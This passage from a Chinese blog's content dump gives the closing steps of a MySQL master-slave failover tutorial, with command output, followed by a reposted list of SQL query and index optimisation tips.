class=\"line\"></span><br><span class=\"line\">mysql&gt; reset master;</span><br><span class=\"line\">Query OK, 0 rows affected (0.06 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; grant replication slave on *.* to <span class=\"string\">&apos;repl&apos;</span>@<span class=\"string\">&apos;192.168.0.100&apos;</span> identified by <span class=\"string\">&apos;123456&apos;</span>;</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt;</span><br></pre></td></tr></table></figure>\n<font style=\"color:red\">3&#x3001;&#x5728;S2&#xFF08;&#x4ECE;&#x5E93;2&#xFF09;&#x4E0A;&#xFF0C;&#x6267;&#x884C;stop slave&#x505C;&#x6B62;&#x4ECE;&#x670D;&#x52A1;&#xFF0C;&#x7136;&#x540E;&#x6267;&#x884C;change master to master_host=&#x2019;S1&#x2019;&#x4EE5;&#x91CD;&#x65B0;&#x8BBE;&#x7F6E;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x6267;&#x884C;start slave&#x542F;&#x52A8;&#x590D;&#x5236;&#xFF1A;</font>\n\n<p>S2&#xFF08;&#x4ECE;&#x5E93;2&#x64CD;&#x4F5C;&#xFF09;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; stop slave;</span><br><span class=\"line\">Query OK, 0 rows affected (0.01 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; change master to master_host=<span class=\"string\">&apos;192.168.0.20&apos;</span>;</span><br><span class=\"line\">Query OK, 0 rows affected (0.06 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; start slave;</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt;</span><br></pre></td></tr></table></figure>\n<font style=\"color:red\">4&#x3001;&#x67E5;&#x770B;S2&#xFF08;&#x4ECE;&#x5E93;2&#xFF09;&#x590D;&#x5236;&#x72B6;&#x6001;&#x662F;&#x5426;&#x6B63;&#x5E38;&#xFF1A;</font>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show slave status\\G</span><br><span class=\"line\">*************************** 1. row ***************************</span><br><span class=\"line\">               Slave_IO_State: Waiting <span class=\"keyword\">for</span> master to send event</span><br><span class=\"line\">                  Master_Host: 192.168.0.20</span><br><span class=\"line\">                  Master_User: repl</span><br><span class=\"line\">                  Master_Port: 3306</span><br><span class=\"line\">                Connect_Retry: 2</span><br><span class=\"line\">              Master_Log_File: mysql-bin.000001</span><br><span class=\"line\">          Read_Master_Log_Pos: 261</span><br><span class=\"line\">               Relay_Log_File: MySQL-02-relay-bin.000002</span><br><span class=\"line\">                Relay_Log_Pos: 407</span><br><span class=\"line\">        Relay_Master_Log_File: mysql-bin.000001</span><br><span class=\"line\">             Slave_IO_Running: Yes</span><br><span class=\"line\">            Slave_SQL_Running: Yes</span><br><span class=\"line\">              Replicate_Do_DB: </span><br><span class=\"line\">          Replicate_Ignore_DB: </span><br><span class=\"line\">           Replicate_Do_Table: </span><br><span class=\"line\">       Replicate_Ignore_Table: </span><br><span class=\"line\">      Replicate_Wild_Do_Table: yayun.%</span><br><span class=\"line\">  Replicate_Wild_Ignore_Table: </span><br><span class=\"line\">                   Last_Errno: 0</span><br><span class=\"line\">                   Last_Error: </span><br><span class=\"line\">                 Skip_Counter: 0</span><br><span class=\"line\">          Exec_Master_Log_Pos: 261</span><br><span class=\"line\">              Relay_Log_Space: 566</span><br><span class=\"line\">              Until_Condition: None</span><br><span class=\"line\">               Until_Log_File: </span><br><span class=\"line\">                Until_Log_Pos: 0</span><br><span class=\"line\">           Master_SSL_Allowed: No</span><br><span class=\"line\">           Master_SSL_CA_File: </span><br><span class=\"line\">           Master_SSL_CA_Path: </span><br><span class=\"line\">              Master_SSL_Cert: </span><br><span class=\"line\">            Master_SSL_Cipher: </span><br><span class=\"line\">               Master_SSL_Key: </span><br><span class=\"line\">        Seconds_Behind_Master: 0</span><br><span class=\"line\">Master_SSL_Verify_Server_Cert: No</span><br><span class=\"line\">                Last_IO_Errno: 0</span><br><span class=\"line\">                Last_IO_Error: </span><br><span class=\"line\">               Last_SQL_Errno: 0</span><br><span class=\"line\">               Last_SQL_Error: </span><br><span class=\"line\">  Replicate_Ignore_Server_Ids: </span><br><span class=\"line\">             Master_Server_Id: 2</span><br><span class=\"line\">row <span class=\"keyword\">in</span> <span class=\"built_in\">set</span> (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt;</span><br></pre></td></tr></table></figure>\n<p>&#x67E5;&#x770B;&#x539F;&#x6765;&#x7684;&#x4ECE;&#x5E93;S1&#xFF0C;&#x73B0;&#x5728;&#x7684;&#x4E3B;&#x5E93;&#x7684;show processlist&#x60C5;&#x51B5;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show  processlist\\G</span><br><span class=\"line\">*************************** 1. row ***************************</span><br><span class=\"line\">     Id: 4</span><br><span class=\"line\">   User: root</span><br><span class=\"line\">   Host: localhost</span><br><span class=\"line\">     db: NULL</span><br><span class=\"line\">Command: Query</span><br><span class=\"line\">   Time: 0</span><br><span class=\"line\">  State: NULL</span><br><span class=\"line\">   Info: show  processlist</span><br><span class=\"line\">*************************** 2. row ***************************</span><br><span class=\"line\">     Id: 7</span><br><span class=\"line\">   User: repl</span><br><span class=\"line\">   Host: 192.168.0.100:60235</span><br><span class=\"line\">     db: NULL</span><br><span class=\"line\">Command: Binlog Dump</span><br><span class=\"line\">   Time: 184</span><br><span class=\"line\">  State: Master has sent all binlog to slave; waiting <span class=\"keyword\">for</span> binlog to be updated</span><br><span class=\"line\">   Info: NULL</span><br><span class=\"line\">rows <span class=\"keyword\">in</span> <span class=\"built_in\">set</span> (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt;</span><br></pre></td></tr></table></figure></p>\n<font style=\"color:red\">5&#x3001;&#x901A;&#x77E5;&#x6240;&#x6709;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x5C06;&#x5E94;&#x7528;&#x6307;&#x5411;S1&#xFF08;&#x5DF2;&#x63D0;&#x5347;&#x4E3A;&#x4E3B;&#x5E93;&#xFF09;,&#x8FD9;&#x6837;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x7684;&#x6240;&#x6709;&#x7684;&#x66F4;&#x65B0;&#x53D8;&#x5316;&#x5C06;&#x8BB0;&#x5F55;&#x5230;S1&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x3002;</font>\n\n<p><font style=\"color:red\">6&#x3001;&#x5220;&#x9664;S1&#xFF08;&#x65B0;&#x7684;&#x4E3B;&#x5E93;&#xFF09;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;master.info&#x548C;relay-log.info&#x6587;&#x4EF6;&#xFF0C;&#x5426;&#x5219;&#x4E0B;&#x6B21;&#x91CD;&#x542F;&#x65F6;&#x8FD8;&#x4F1A;&#x6309;&#x7167;&#x4ECE;&#x5E93;&#x542F;&#x52A8;&#x3002;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x8BE5;&#x53C2;&#x6570;&#xFF1A;</font><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">skip_slave_start</span><br></pre></td></tr></table></figure></p>\n<p>7&#x3001;&#x6700;&#x540E;&#xFF0C;&#x5982;&#x679C;M&#x670D;&#x52A1;&#x5668;&#x4FEE;&#x590D;&#x4EE5;&#x540E;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x6309;&#x7167;S2&#x7684;&#x65B9;&#x6CD5;&#x914D;&#x7F6E;&#x6210;S1&#x7684;&#x4ECE;&#x5E93;&#x3002;</p>\n<p>8&#x3001;&#x4E0A;&#x9762;&#x7684;&#x6D4B;&#x8BD5;&#x6B65;&#x9AA4;&#x4E2D;S1&#x9ED8;&#x8BA4;&#x90FD;&#x662F;&#x6253;&#x5F00;log-bin&#x9009;&#x9879;&#x7684;&#xFF0C;&#x8FD9;&#x6837;&#x91CD;&#x7F6E;&#x6210;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x540E;&#x53EF;&#x4EE5;&#x5C06;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x8BB0;&#x5F55;&#x4E0B;&#x6765;&#xFF0C;&#x5E76;&#x4F20;&#x9001;&#x5230;&#x5176;&#x4ED6;&#x4ECE;&#x5E93;&#xFF0C;&#x8FD9;&#x662F;&#x63D0;&#x5347;&#x4E3A;&#x4E3B;&#x5E93;&#x5FC5;&#x987B;&#x7684;&#x3002;&#x5176;&#x6B21;&#xFF0C;S1&#x6CA1;&#x6709;&#x6253;&#x5F00;log-slave-updates&#x53C2;&#x6570;&#xFF0C;&#x5426;&#x5219;&#x91CD;&#x7F6E;&#x6210;&#x4E3B;&#x5E93;&#x4EE5;&#x540E;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x5C06;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#x8FC7;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x91CD;&#x590D;&#x4F20;&#x9001;&#x7ED9;S2&#xFF0C;&#x5BFC;&#x81F4;S2&#x540C;&#x6B65;&#x9519;&#x8BEF;&#x3002;</p>\n<hr>\n<h3 id=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"><a href=\"#&#x76F8;&#x5173;&#x94FE;&#x63A5;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"></a>&#x76F8;&#x5173;&#x94FE;&#x63A5;</h3><p>&#x4E3B;&#x4ECE;&#x5207;&#x6362;&#x811A;&#x672C;&#x53C2;&#x8003;&#x94FE;&#x63A5;&#xFF1A;<a href=\"http://blog.itpub.net/25356953/viewspace-1745534/\">http://blog.itpub.net/25356953/viewspace-1745534/</a></p>"},{"title":"MySQL优化总结，百万级数据库优化方案","toc":false,"date":"2016-05-27T14:02:00.000Z","_content":"\n1、对查询进行优化，应尽量避免全表扫描，首先应考虑在 where 及 order by 涉及的列上建立索引。\n\n2、应尽量避免在 where 子句中对字段进行 null 值判断，否则将导致引擎放弃使用索引而进行全表扫描，\n``` bash\nSql 代码 : select id from t where num is null;\n```\n可以在 num 上设置默认值 0,确保表中 num 列没有 null 值，然后这样查询：\n``` bash\nSql 代码 : select id from t where num=0;\n```\n3、应尽量避免在 where 子句中使用!=或<>操作符，否则将引擎放弃使用索引而进行全表扫描。\n\n4、应尽量避免在 where 子句中使用 or 来连接条件，否则将导致引擎放弃使用索引而进行全表扫描，\n``` bash\nSql 代码 : select id from t where num=10 or num=20;\n```\n可以这样查询：\n``` bash\nSql 代码 : select id from t where num=10 union all select id from t where num=20;\n```\n<!--more-->\n5、in 和 not in 也要慎用，否则会导致全表扫描，如：\n``` bash\nSql 代码 : select id from t where num in(1,2,3);\n```\n对于连续的数值，能用 between 就不要用 in 了：\n``` bash\nSql 代码 : select id from t where num between 1 and 3;\n```\n6、下面的查询也将导致全表扫描：\n``` bash\nSql 代码 : select id from t where name like '%c%';\n```\n若要提高效率，可以考虑全文检索。\n\n7、如果在 where 子句中使用参数，也会导致全表扫描。因为 SQL 只有在运行时才会解析局部变量，但优 化程序不能将访问计划的选择推迟到运行时;它必须在编译时进行选择。然 而，如果在编译时建立访问计 划，变量的值还是未知的，因而无法作为索引选择的输入项。如下面语句将进行全表扫描：\n``` bash\nSql 代码 : select id from t where num=@num ;\n```\n可以改为强制查询使用索引：\n``` bash\nSql 代码 : select id from t with(index(索引名)) where num=@num ;\n```\n8、应尽量避免在 where 子句中对字段进行表达式操作， 这将导致引擎放弃使用索引而进行全表扫描。\n``` bash\nSql 代码 : select id from t where num/2=100;\n```\n可以这样查询：\n``` bash\nSql 代码 : select id from t where num=100*2;\n```\n9、应尽量避免在 where 子句中对字段进行函数操作，这将导致引擎放弃使用索引而进行全表扫描。如：\n``` bash\nSql 代码 : select id from t where substring(name,1,3)='abc';#name 以 abc 开头的 id\n```\n应改为：\n``` bash\nSql 代码 : select id from t where name like 'abc%';\n```\n10、不要在 where 子句中的“=”左边进行函数、算术运算或其他表达式运算，否则系统将可能无法正确使用 索引。\n\n11、在使用索引字段作为条件时，如果该索引是复合索引，那么必须使用到该索引中的第一个字段作为条件 时才能保证系统使用该索引， 否则该索引将不会 被使用， 并且应尽可能的让字段顺序与索引顺序相一致。\n\n12、不要写一些没有意义的查询，如需要生成一个空表结构：\n``` bash\nSql 代码 : select col1,col2 into #t from t where 1=0;\n```\n这类代码不会返回任何结果集，但是会消耗系统资源的，应改成这样：\n``` bash\nSql 代码 : create table #t(…);\n```\n13、很多时候用 exists 代替 in 是一个好的选择：\n``` bash\nSql 代码 : select num from a where num in(select num from b);\n```\n用下面的语句替换：\n``` bash\nSql 代码 : select num from a where exists(select 1 from b where num=a、num);\n```\n14、并不是所有索引对查询都有效，SQL 是根据表中数据来进行查询优化的，当索引列有大量数据重复时， SQL 查询可能不会去利用索引，如一表中有字段 ***,male、female 几乎各一半，那么即使在 *** 上建 了索引也对查询效率起不了作用。\n\n15、索引并不是越多越好，索引固然可以提高相应的 select 的效率，但同时也降低了 insert 及 update 的效率，因为 insert 或 update 时有可能会重建索引，所以怎样建索引需要慎重考虑，视具体情况而定。一个表的索引数最好不要超过 6 个，若太多则应考虑一些不常使用到的列上建的索引是否有必要。\n\n16、应尽可能的避免更新 clustered 索引数据列， 因为 clustered 索引数据列的顺序就是表记录的物理存储顺序，一旦该列值改变将导致整个表记录的顺序的调整，会耗费相当大的资源。若应用系统需要频繁更新 clustered 索引数据列，那么需要考虑是否应将该索引建为 clustered 索引。\n\n17、尽量使用数字型字段，若只含数值信息的字段尽量不要设计为字符型，这会降低查询和连接的性能，并 会增加存储开销。这是因为引擎在处理查询和连接时会逐个比较字符串中每一个字符，而对于数字型而言 只需要比较一次就够了。\n\n18、尽可能的使用 varchar/nvarchar 代替 char/nchar , 因为首先变长字段存储空间小， 可以节省存储空间， 其次对于查询来说，在一个相对较小的字段内搜索效率显然要高些。\n\n19、任何地方都不要使用 select * from t ,用具体的字段列表代替“*”,不要返回用不到的任何字段。\n\n20、尽量使用表变量来代替临时表。如果表变量包含大量数据，请注意索引非常有限(只有主键索引)。\n\n21、避免频繁创建和删除临时表，以减少系统表资源的消耗。\n\n22、临时表并不是不可使用，适当地使用它们可以使某些例程更有效，例如，当需要重复引用大型表或常用 表中的某个数据集时。但是，对于一次性事件， 最好使用导出表。\n\n23、在新建临时表时，如果一次性插入数据量很大，那么可以使用 select into 代替 create table,避免造成大量 log ,以提高速度;如果数据量不大，为了缓和系统表的资源，应先 create table,然后 insert、\n\n24、如果使用到了临时表， 在存储过程的最后务必将所有的临时表显式删除， 先 truncate table ,然后 drop table ,这样可以避免系统表的较长时间锁定。\n\n25、尽量避免使用游标，因为游标的效率较差，如果游标操作的数据超过 1 万行，那么就应该考虑改写。\n\n26、使用基于游标的方法或临时表方法之前，应先寻找基于集的解决方案来解决问题，基于集的方法通常更 有效。\n\n27、与临时表一样，游标并不是不可使用。对小型数据集使用 FAST_FORWARD 游标通常要优于其他逐行处理方法，尤其是在必须引用几个表才能获得所需的数据时。在结果集中包括“合计”的例程通常要比使用游标执行的速度快。如果开发时间允许，基于游标的方法和基于集的方法都可以尝试一下，看哪一种方法的效果更好。\n\n28、在所有的存储过程和触发器的开始处设置 SET NOCOUNT ON ,在结束时设置 SET NOCOUNT OFF 、无需在执行存储过程和触发器的每个语句后向客户端发送 DONE_IN_PROC 消息。\n\n29、尽量避免大事务操作，提高系统并发能力。 sql 优化方法使用索引来更快地遍历表。 缺省情况下建立的索引是非群集索引，但有时它并不是最佳的。在非群集索引下，数据在物理上随机存放在数据页上。合理的索引设计要建立在对各种查询的分析和预测上。一般来说：\n\na、有大量重复值、且经常有范围查询( > ,< ,> =,< =)和 order by、group by 发生的列，可考虑建立集群索引;\n\nb、经常同时存取多列，且每列都含有重复值可考虑建立组合索引;\n\nc、组合索引要尽量使关键查询形成索引覆盖，其前导列一定是使用最频繁的列。索引虽有助于提高性能但 不是索引越多越好，恰好相反过多的索引会导致系统低效。用户在表中每加进一个索引，维护索引集合就 要做相应的更新工作。\n\n30、定期分析表和检查表。\n``` bash\n分析表的语法：ANALYZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE tb1_name[, tbl_name]、、、\n```\n以上语句用于分析和存储表的关键字分布，分析的结果将可以使得系统得到准确的统计信息，使得SQL能够生成正确的执行计划。如果用户感觉实际执行计划并不是预期的执行计划，执行一次分析表可能会解决问题。在分析期间，使用一个读取锁定对表进行锁定。这对于MyISAM，DBD和InnoDB表有作用。\n``` bash\n例如分析一个数据表：analyze table table_name\n检查表的语法：CHECK TABLE tb1_name[,tbl_name]、、、[option]、、、option = {QUICK | FAST | MEDIUM | EXTENDED | CHANGED}\n```\n检查表的作用是检查一个或多个表是否有错误，CHECK TABLE 对MyISAM 和 InnoDB表有作用，对于MyISAM表，关键字统计数据被更新\n\nCHECK TABLE 也可以检查视图是否有错误，比如在视图定义中被引用的表不存在。\n\n31、定期优化表。\n``` bash\n优化表的语法：OPTIMIZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE tb1_name [,tbl_name]、、、\n```\n如果删除了表的一大部分，或者如果已经对含有可变长度行的表(含有 VARCHAR、BLOB或TEXT列的表)进行更多更改，则应使用OPTIMIZE TABLE命令来进行表优化。这个命令可以将表中的空间碎片进行合并，并且可以消除由于删除或者更新造成的空间浪费，但OPTIMIZE TABLE 命令只对MyISAM、 BDB 和InnoDB表起作用。\n``` bash\n例如： optimize table table_name\n```\n注意： analyze、check、optimize执行期间将对表进行锁定，因此一定注意要在MySQL数据库不繁忙的时候执行相关的操作。\n\n补充：\n1、在海量查询时尽量少用格式转换。\n2、ORDER BY 和 GROPU BY:使用 ORDER BY 和 GROUP BY 短语，任何一种索引都有助于 SELECT 的性能提高。\n3、任何对列的操作都将导致表扫描，它包括数据库教程函数、计算表达式等等，查询时要尽可能将操作移 至等号右边。\n4、IN、OR 子句常会使用工作表，使索引失效。如果不产生大量重复值，可以考虑把子句拆开。拆开的子 句中应该包含索引。\n5、只要能满足你的需求，应尽可能使用更小的数据类型：例如使用 MEDIUMINT 代替 INT\n6、尽量把所有的列设置为 NOT NULL,如果你要保存 NULL,手动去设置它，而不是把它设为默认值。\n7、尽量少用 VARCHAR、TEXT、BLOB 类型\n8、如果你的数据只有你所知的少量的几个。最好使用 ENUM 类型\n9、正如 graymice 所讲的那样，建立索引。\n10、合理用运分表与分区表提高数据存放和提取速度。","source":"_posts/MySQL数据库优化方法.md","raw":"---\ntitle: MySQL优化总结，百万级数据库优化方案\ntags:\n  - MySQL\n  - 性能调优\ncategories:\n  - 我的收藏\ntoc: false\ndate: 2016-5-27 22:02:00\n---\n\n1、对查询进行优化，应尽量避免全表扫描，首先应考虑在 where 及 order by 涉及的列上建立索引。\n\n2、应尽量避免在 where 子句中对字段进行 null 值判断，否则将导致引擎放弃使用索引而进行全表扫描，\n``` bash\nSql 代码 : select id from t where num is null;\n```\n可以在 num 上设置默认值 0,确保表中 num 列没有 null 值，然后这样查询：\n``` bash\nSql 代码 : select id from t where num=0;\n```\n3、应尽量避免在 where 子句中使用!=或<>操作符，否则将引擎放弃使用索引而进行全表扫描。\n\n4、应尽量避免在 where 子句中使用 or 来连接条件，否则将导致引擎放弃使用索引而进行全表扫描，\n``` bash\nSql 代码 : select id from t where num=10 or num=20;\n```\n可以这样查询：\n``` bash\nSql 代码 : select id from t where num=10 union all select id from t where num=20;\n```\n<!--more-->\n5、in 和 not in 也要慎用，否则会导致全表扫描，如：\n``` bash\nSql 代码 : select id from t where num in(1,2,3);\n```\n对于连续的数值，能用 between 就不要用 in 了：\n``` bash\nSql 代码 : select id from t where num between 1 and 3;\n```\n6、下面的查询也将导致全表扫描：\n``` bash\nSql 代码 : select id from t where name like '%c%';\n```\n若要提高效率，可以考虑全文检索。\n\n7、如果在 where 子句中使用参数，也会导致全表扫描。因为 SQL 只有在运行时才会解析局部变量，但优 化程序不能将访问计划的选择推迟到运行时;它必须在编译时进行选择。然 而，如果在编译时建立访问计 划，变量的值还是未知的，因而无法作为索引选择的输入项。如下面语句将进行全表扫描：\n``` bash\nSql 代码 : select id from t where num=@num ;\n```\n可以改为强制查询使用索引：\n``` bash\nSql 代码 : select id from t with(index(索引名)) where num=@num ;\n```\n8、应尽量避免在 where 子句中对字段进行表达式操作， 这将导致引擎放弃使用索引而进行全表扫描。\n``` bash\nSql 代码 : select id from t where num/2=100;\n```\n可以这样查询：\n``` bash\nSql 代码 : select id from t where num=100*2;\n```\n9、应尽量避免在 where 子句中对字段进行函数操作，这将导致引擎放弃使用索引而进行全表扫描。如：\n``` bash\nSql 代码 : select id from t where substring(name,1,3)='abc';#name 以 abc 开头的 id\n```\n应改为：\n``` bash\nSql 代码 : select id from t where name like 'abc%';\n```\n10、不要在 where 子句中的“=”左边进行函数、算术运算或其他表达式运算，否则系统将可能无法正确使用 索引。\n\n11、在使用索引字段作为条件时，如果该索引是复合索引，那么必须使用到该索引中的第一个字段作为条件 时才能保证系统使用该索引， 否则该索引将不会 被使用， 并且应尽可能的让字段顺序与索引顺序相一致。\n\n12、不要写一些没有意义的查询，如需要生成一个空表结构：\n``` bash\nSql 代码 : select col1,col2 into #t from t where 1=0;\n```\n这类代码不会返回任何结果集，但是会消耗系统资源的，应改成这样：\n``` bash\nSql 代码 : create table #t(…);\n```\n13、很多时候用 exists 代替 in 是一个好的选择：\n``` bash\nSql 代码 : select num from a where num in(select num from b);\n```\n用下面的语句替换：\n``` bash\nSql 代码 : select num from a where exists(select 1 from b where num=a、num);\n```\n14、并不是所有索引对查询都有效，SQL 是根据表中数据来进行查询优化的，当索引列有大量数据重复时， SQL 查询可能不会去利用索引，如一表中有字段 ***,male、female 几乎各一半，那么即使在 *** 上建 了索引也对查询效率起不了作用。\n\n15、索引并不是越多越好，索引固然可以提高相应的 select 的效率，但同时也降低了 insert 及 update 的效率，因为 insert 或 update 时有可能会重建索引，所以怎样建索引需要慎重考虑，视具体情况而定。一个表的索引数最好不要超过 6 个，若太多则应考虑一些不常使用到的列上建的索引是否有必要。\n\n16、应尽可能的避免更新 clustered 索引数据列， 因为 clustered 索引数据列的顺序就是表记录的物理存储顺序，一旦该列值改变将导致整个表记录的顺序的调整，会耗费相当大的资源。若应用系统需要频繁更新 clustered 索引数据列，那么需要考虑是否应将该索引建为 clustered 索引。\n\n17、尽量使用数字型字段，若只含数值信息的字段尽量不要设计为字符型，这会降低查询和连接的性能，并 会增加存储开销。这是因为引擎在处理查询和连接时会逐个比较字符串中每一个字符，而对于数字型而言 只需要比较一次就够了。\n\n18、尽可能的使用 varchar/nvarchar 代替 char/nchar , 因为首先变长字段存储空间小， 可以节省存储空间， 其次对于查询来说，在一个相对较小的字段内搜索效率显然要高些。\n\n19、任何地方都不要使用 select * from t ,用具体的字段列表代替“*”,不要返回用不到的任何字段。\n\n20、尽量使用表变量来代替临时表。如果表变量包含大量数据，请注意索引非常有限(只有主键索引)。\n\n21、避免频繁创建和删除临时表，以减少系统表资源的消耗。\n\n22、临时表并不是不可使用，适当地使用它们可以使某些例程更有效，例如，当需要重复引用大型表或常用 表中的某个数据集时。但是，对于一次性事件， 最好使用导出表。\n\n23、在新建临时表时，如果一次性插入数据量很大，那么可以使用 select into 代替 create table,避免造成大量 log ,以提高速度;如果数据量不大，为了缓和系统表的资源，应先 create table,然后 insert、\n\n24、如果使用到了临时表， 在存储过程的最后务必将所有的临时表显式删除， 先 truncate table ,然后 drop table ,这样可以避免系统表的较长时间锁定。\n\n25、尽量避免使用游标，因为游标的效率较差，如果游标操作的数据超过 1 万行，那么就应该考虑改写。\n\n26、使用基于游标的方法或临时表方法之前，应先寻找基于集的解决方案来解决问题，基于集的方法通常更 有效。\n\n27、与临时表一样，游标并不是不可使用。对小型数据集使用 FAST_FORWARD 游标通常要优于其他逐行处理方法，尤其是在必须引用几个表才能获得所需的数据时。在结果集中包括“合计”的例程通常要比使用游标执行的速度快。如果开发时间允许，基于游标的方法和基于集的方法都可以尝试一下，看哪一种方法的效果更好。\n\n28、在所有的存储过程和触发器的开始处设置 SET NOCOUNT ON ,在结束时设置 SET NOCOUNT OFF 、无需在执行存储过程和触发器的每个语句后向客户端发送 DONE_IN_PROC 消息。\n\n29、尽量避免大事务操作，提高系统并发能力。 sql 优化方法使用索引来更快地遍历表。 缺省情况下建立的索引是非群集索引，但有时它并不是最佳的。在非群集索引下，数据在物理上随机存放在数据页上。合理的索引设计要建立在对各种查询的分析和预测上。一般来说：\n\na、有大量重复值、且经常有范围查询( > ,< ,> =,< =)和 order by、group by 发生的列，可考虑建立集群索引;\n\nb、经常同时存取多列，且每列都含有重复值可考虑建立组合索引;\n\nc、组合索引要尽量使关键查询形成索引覆盖，其前导列一定是使用最频繁的列。索引虽有助于提高性能但 不是索引越多越好，恰好相反过多的索引会导致系统低效。用户在表中每加进一个索引，维护索引集合就 要做相应的更新工作。\n\n30、定期分析表和检查表。\n``` bash\n分析表的语法：ANALYZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE tb1_name[, tbl_name]、、、\n```\n以上语句用于分析和存储表的关键字分布，分析的结果将可以使得系统得到准确的统计信息，使得SQL能够生成正确的执行计划。如果用户感觉实际执行计划并不是预期的执行计划，执行一次分析表可能会解决问题。在分析期间，使用一个读取锁定对表进行锁定。这对于MyISAM，DBD和InnoDB表有作用。\n``` bash\n例如分析一个数据表：analyze table table_name\n检查表的语法：CHECK TABLE tb1_name[,tbl_name]、、、[option]、、、option = {QUICK | FAST | MEDIUM | EXTENDED | CHANGED}\n```\n检查表的作用是检查一个或多个表是否有错误，CHECK TABLE 对MyISAM 和 InnoDB表有作用，对于MyISAM表，关键字统计数据被更新\n\nCHECK TABLE 也可以检查视图是否有错误，比如在视图定义中被引用的表不存在。\n\n31、定期优化表。\n``` bash\n优化表的语法：OPTIMIZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE tb1_name [,tbl_name]、、、\n```\n如果删除了表的一大部分，或者如果已经对含有可变长度行的表(含有 VARCHAR、BLOB或TEXT列的表)进行更多更改，则应使用OPTIMIZE TABLE命令来进行表优化。这个命令可以将表中的空间碎片进行合并，并且可以消除由于删除或者更新造成的空间浪费，但OPTIMIZE TABLE 命令只对MyISAM、 BDB 和InnoDB表起作用。\n``` bash\n例如： optimize table table_name\n```\n注意： analyze、check、optimize执行期间将对表进行锁定，因此一定注意要在MySQL数据库不繁忙的时候执行相关的操作。\n\n补充：\n1、在海量查询时尽量少用格式转换。\n2、ORDER BY 和 GROPU BY:使用 ORDER BY 和 GROUP BY 短语，任何一种索引都有助于 SELECT 的性能提高。\n3、任何对列的操作都将导致表扫描，它包括数据库教程函数、计算表达式等等，查询时要尽可能将操作移 至等号右边。\n4、IN、OR 子句常会使用工作表，使索引失效。如果不产生大量重复值，可以考虑把子句拆开。拆开的子 句中应该包含索引。\n5、只要能满足你的需求，应尽可能使用更小的数据类型：例如使用 MEDIUMINT 代替 INT\n6、尽量把所有的列设置为 NOT 